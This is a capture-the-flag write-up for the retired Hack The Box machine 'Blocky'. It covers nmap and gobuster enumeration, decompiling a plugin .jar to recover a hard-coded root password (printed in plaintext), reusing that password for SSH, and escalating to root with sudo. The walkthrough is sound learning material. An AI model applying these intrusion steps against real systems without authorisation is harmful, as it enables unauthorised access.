# Blocky

This is the write-up for the box Blocky that got retired at the 9th December 2017.
My IP address was 10.10.14.25 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.37    blocky.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/blocky.nmap 10.10.10.37
```

```markdown
PORT     STATE  SERVICE VERSION
21/tcp   open   ftp     ProFTPD 1.3.5a
22/tcp   open   ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp   open   http    Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: WordPress 4.8
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: BlockyCraft &#8211; Under Construction!
8192/tcp closed sophos
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web page is installed as a WordPress page with one article written by the user _Notch_, which seems to be a Minecraft blog.
Lets search for hidden paths with **Gobuster**:
```markdown
gobuster -u http://10.10.10.37 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Except for the default WordPress paths there are some more:
- /wiki
  - Says that it is _Under Construction_ and nothing else
- /plugins
  - Two **.jar** files to download with the names _BlockyCore.jar_ and _griefprevention-1.11.2-3.1.1.98.jar_
- /javascript
  - HTTP code 403 Forbidden
- /phpmyadmin
  - **phpMyAdmin** installation

Lets look into those Java files.

### Examining the Java files

It is possible to extract the files out of a .jar file with the `unzip` command:
```markdown
unzip BlockyCore.jar
```

It extracts the folder **META-INF** with a **MANIFEST.MF** file that has only the manifest version as content.
And it extracts the file **com/myfirstplugin/BlockyCore.class** which is a Java class file, that can be compiled with the `jad` command:
```markdown
jad BlockyCore.jar
```

This extracts the source code which is now readable. Here is the most important part:
```java
(...)
public class BlockyCore
{

    public BlockyCore()
    {
        sqlHost = "localhost";
        sqlUser = "root";
        sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
    }

    public void onServerStart()
(...)
```

The username and password of a root user are coded in plaintext in this file.

### Using the credentials on FTP and SSH

The credentials don't work on FTP nor on SSH with the user _root_.
But trying them with the user _Notch_ which is an author on the WordPress blog, this password works and we are authenticated on the box.

## Privilege Escalation

When looking for `sudo` privileges for this user, he can run every command as root.
```markdown
sudo -l

# Output
User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
```
```markdown
sudo su
```

This means we can do anything on this box as root or switch user to root!
